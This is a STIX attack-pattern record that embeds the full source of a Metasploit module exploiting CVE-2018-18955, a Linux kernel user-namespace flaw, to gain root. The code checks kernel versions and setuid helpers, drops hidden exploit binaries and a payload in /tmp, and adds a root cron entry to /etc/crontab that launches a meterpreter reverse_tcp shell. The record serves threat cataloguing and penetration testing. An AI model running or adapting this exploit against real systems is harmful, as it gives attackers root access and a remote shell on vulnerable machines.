{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b648a291-a4ab-4dcf-a2f9-15905e81e117",
    "created": "2024-08-14T16:59:51.343897Z",
    "modified": "2024-08-14T16:59:51.343901Z",
    "name": "Linux Nested User Namespace idmap Limit Local Privilege Escalation",
    "description": " This module exploits a vulnerability in Linux kernels 4.15.0 to 4.18.18 and 4.19.0 to 4.19.1, where broken uid/gid mappings between nested user namespaces and kernel uid/gid mappings allow elevation to root",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/nested_namespace_idmap_limit_priv_esc.rb",
            "external_id": "nested_namespace_idmap_limit_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-18955"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=1712"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955"
        },
        {
            "source_name": "reference",
            "url": "https://lwn.net/Articles/532593/"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.launchpad.net/bugs/1801924"
        },
        {
            "source_name": "reference",
            "url": "https://people.canonical.com/~ubuntu-security/cve/CVE-2018-18955"
        },
        {
            "source_name": "reference",
            "url": "https://security-tracker.debian.org/tracker/CVE-2018-18955"
        },
        {
            "source_name": "reference",
            "url": "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd"
        },
        {
            "source_name": "reference",
            "url": "https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.18.19"
        },
        {
            "source_name": "reference",
            "url": "https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.19.2"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Nested User Namespace idmap Limit Local Privilege Escalation',\n        'Description' => %q{\n          This module exploits a vulnerability in Linux kernels 4.15.0 to 4.18.18,\n          and 4.19.0 to 4.19.1, where broken uid/gid mappings between nested user\n          namespaces and kernel uid/gid mappings allow elevation to root\n          (CVE-2018-18955).\n\n          The target system must have unprivileged user namespaces enabled and\n          the newuidmap and newgidmap helpers installed (from uidmap package).\n\n          This module has been tested successfully on:\n\n          Fedora Workstation 28 kernel 4.16.3-301.fc28.x86_64;\n          Kubuntu 18.04 LTS kernel 4.15.0-20-generic (x86_64);\n          Linux Mint 19 kernel 4.15.0-20-generic (x86_64);\n          Ubuntu Linux 18.04.1 LTS kernel 4.15.0-20-generic (x86_64).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Jann Horn', # Discovery and exploit\n          'bcoles' # Metasploit\n        ],\n        'DisclosureDate' => '2018-11-15',\n        'Platform' => ['linux'],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Targets' => [['Auto', {}]],\n        'Privileged' => true,\n        'References' => [\n          ['BID', '105941'],\n          ['CVE', '2018-18955'],\n          ['EDB', '45886'],\n          ['PACKETSTORM', '150381'],\n          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1712'],\n          ['URL', 'https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955'],\n          ['URL', 'https://lwn.net/Articles/532593/'],\n          ['URL', 'https://bugs.launchpad.net/bugs/1801924'],\n          ['URL', 'https://people.canonical.com/~ubuntu-security/cve/CVE-2018-18955'],\n          ['URL', 'https://security-tracker.debian.org/tracker/CVE-2018-18955'],\n          ['URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd'],\n          ['URL', 'https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.18.19'],\n          ['URL', 'https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.19.2']\n        ],\n        'DefaultOptions' => {\n          'AppendExit' => true,\n          'PrependSetresuid' => true,\n          'PrependSetreuid' => true,\n          'PrependSetuid' => true,\n          'PrependFork' => true,\n          'WfsDelay' => 60,\n          'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'\n        },\n        'Notes' => {\n          'AKA' => ['subuid_shell.c'],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ]\n        },\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n    register_options [\n      OptEnum.new('COMPILE', [true, 'Compile on target', 'Auto', %w[Auto True False]])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    chmod path\n  end\n\n  def upload_and_compile(path, data)\n    upload \"#{path}.c\", data\n\n    gcc_cmd = \"gcc -o #{path} #{path}.c\"\n    if session.type.eql? 'shell'\n      gcc_cmd = \"PATH=$PATH:/usr/bin/ #{gcc_cmd}\"\n    end\n    output = cmd_exec gcc_cmd\n\n    unless output.blank?\n      print_error output\n      fail_with Failure::Unknown, \"#{path}.c failed to compile. Set COMPILE False to upload a pre-compiled executable.\"\n    end\n\n    register_file_for_cleanup path\n    chmod path, 0755\n  end\n\n  def strip_comments(c_code)\n    c_code.gsub(%r{/\\*.*?\\*/}m, '').gsub(%r{^\\s*//.*$}, '')\n  end\n\n  def exploit_data(file)\n    ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2018-18955', file)\n  end\n\n  def live_compile?\n    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')\n\n    if has_gcc?\n      vprint_good 'gcc is installed'\n      return true\n    end\n\n    unless datastore['COMPILE'].eql? 'Auto'\n      fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'\n    end\n  end\n\n  def check\n    ['/usr/bin/newuidmap', '/usr/bin/newgidmap'].each do |path|\n      return CheckCode::Safe(\"#{path} file not found\") unless file? path\n      return CheckCode::Safe(\"#{path} is not setuid\") unless setuid? path\n\n      vprint_good \"#{path} is set-uid\"\n    end\n\n    # Patched in 4.18.19 and 4.19.2\n    release = kernel_release\n    v = Rex::Version.new release.split('-').first\n    if v < Rex::Version.new('4.15') ||\n       v >= Rex::Version.new('4.19.2') ||\n       (v >= Rex::Version.new('4.18.19') && v < Rex::Version.new('4.19'))\n      vprint_error \"Kernel version #{release} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Kernel version #{release} appears to be vulnerable\"\n\n    config = kernel_config\n    if config.nil?\n      vprint_error 'Could not retrieve kernel config'\n      return CheckCode::Unknown\n    end\n\n    unless config.include? 'CONFIG_USER_NS=y'\n      vprint_error 'Kernel config does not include CONFIG_USER_NS'\n      return CheckCode::Safe\n    end\n    vprint_good 'Kernel config has CONFIG_USER_NS enabled'\n\n    unless userns_enabled?\n      vprint_error 'Unprivileged user namespaces are not permitted'\n      return CheckCode::Safe\n    end\n    vprint_good 'Unprivileged user namespaces are permitted'\n\n    CheckCode::Appears\n  end\n\n  def on_new_session(session)\n    if session.type.to_s.eql? 'meterpreter'\n      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'\n      session.sys.process.execute '/bin/sh', \"-c \\\"/bin/sed -i '\\$ d' /etc/crontab\\\"\"\n    else\n      session.shell_command(\"/bin/sed -i '\\$ d' /etc/crontab\")\n    end\n  ensure\n    super\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # Upload executables\n    subuid_shell_name = \".#{rand_text_alphanumeric 5..10}\"\n    subuid_shell_path = \"#{base_dir}/#{subuid_shell_name}\"\n    subshell_name = \".#{rand_text_alphanumeric 5..10}\"\n    subshell_path = \"#{base_dir}/#{subshell_name}\"\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n      upload_and_compile subuid_shell_path, strip_comments(exploit_data('subuid_shell.c'))\n      upload_and_compile subshell_path, strip_comments(exploit_data('subshell.c'))\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      upload_and_chmodx subuid_shell_path, exploit_data('subuid_shell.out')\n      upload_and_chmodx subshell_path, exploit_data('subshell.out')\n    end\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric 5..10}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    # Launch exploit\n    print_status 'Adding cron job...'\n    output = cmd_exec \"echo \\\"echo '* * * * * root #{payload_path}' >> /etc/crontab\\\" | #{subuid_shell_path} #{subshell_path} \"\n    output.each_line { |line| vprint_status line.chomp }\n\n    crontab = read_file '/etc/crontab'\n    unless crontab.include? payload_path\n      fail_with Failure::Unknown, 'Failed to add cronjob'\n    end\n\n    print_good 'Success. Waiting for job to run (may take a minute)...'\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-11-15",
    "x_mitre_platforms": [
        "['linux']"
    ]
}